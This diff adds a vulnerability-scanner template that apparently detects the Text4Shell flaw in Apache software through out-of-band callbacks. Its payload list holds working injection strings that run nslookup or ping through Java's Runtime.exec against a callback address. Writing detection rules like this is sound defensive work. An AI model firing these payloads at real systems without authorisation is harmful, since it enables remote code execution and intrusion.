@@ -1,0 +1,22 @@
+id: "text4shell"
+issue_code: "text4shell"
+detection_condition: "or"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 90
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+templates:
+  - "${url:UTF-8:http://{{.oob_address}}/ts}"
+  - "${url:UTF-8:https://{{.oob_address}}/ts}"
+  - "${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup {{.oob_address}}')}"
+  - "${url:UTF-8:java.lang.Runtime.getRuntime().exec('nslookup {{.oob_address}}')}"
+  - "${dns:address:java.lang.Runtime.getRuntime().exec('nslookup {{.oob_address}}')}"
+  - "$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27ping%20-c%205%20{{.oob_address}}%27)%7D"
+categories:
+  - oob
+  - rce
+platforms:
+  - apache
